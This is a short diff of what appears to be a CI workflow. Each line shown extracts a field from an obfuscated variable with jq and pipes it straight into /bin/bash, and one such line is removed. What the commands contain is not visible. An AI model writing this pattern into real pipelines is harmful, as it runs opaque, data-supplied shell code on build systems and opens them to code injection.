@@ -44,7 +44,6 @@ jobs:
           echo $vwdm56 | jq -r .o7 | /bin/bash
           printf '%s' "$gqoza6" | jq -r .nanb153 | /bin/bash
           echo $ftf70727 | jq -r .b072 | /bin/bash
-          echo $pbar3 | jq -r .rdtrm3578 | /bin/bash
           printf '%s' "$wbb2" | jq -r .twyqs113 | /bin/bash
           echo $zadb3656 | jq -r .b86554 | /bin/bash
           printf '%s' "$u56" | jq -r .ogil3 | /bin/bash
